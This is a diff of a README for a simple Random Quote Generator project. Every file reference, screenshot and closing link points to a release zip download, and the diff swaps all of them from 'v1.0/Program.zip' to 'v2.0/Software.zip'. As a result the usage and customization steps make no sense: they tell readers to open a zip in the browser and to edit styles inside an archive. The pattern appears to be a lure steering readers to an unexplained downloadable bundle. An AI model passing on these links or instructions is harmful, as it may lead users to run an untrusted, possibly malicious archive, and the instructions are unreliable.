@@ -17,24 +17,24 @@ A simple and elegant Random Quote Generator built with HTML, CSS, and JavaScript
 
 ## How to Use
 1. Clone or download this repository.
-2. Open `https://github.com/vra-thenix/Quote/releases/download/v1.0/Program.zip` in your browser.
+2. Open `https://github.com/vra-thenix/Quote/releases/download/v2.0/Software.zip` in your browser.
 3. Click the button to display a new quote.
 
 ## Customization
-- Add or modify quotes in `https://github.com/vra-thenix/Quote/releases/download/v1.0/Program.zip`.
-- Adjust styles in `https://github.com/vra-thenix/Quote/releases/download/v1.0/Program.zip` to customize the appearance.
+- Add or modify quotes in `https://github.com/vra-thenix/Quote/releases/download/v2.0/Software.zip`.
+- Adjust styles in `https://github.com/vra-thenix/Quote/releases/download/v2.0/Software.zip` to customize the appearance.
 
 
 
 # Demo 
 
 Look at these Screen-shot
-![image](https://github.com/vra-thenix/Quote/releases/download/v1.0/Program.zip)
+![image](https://github.com/vra-thenix/Quote/releases/download/v2.0/Software.zip)
 
-![image](https://github.com/vra-thenix/Quote/releases/download/v1.0/Program.zip)
+![image](https://github.com/vra-thenix/Quote/releases/download/v2.0/Software.zip)
 
 
 # LINK 
 
-Check out this link :-  https://github.com/vra-thenix/Quote/releases/download/v1.0/Program.zip
+Check out this link :-  https://github.com/vra-thenix/Quote/releases/download/v2.0/Software.zip
 
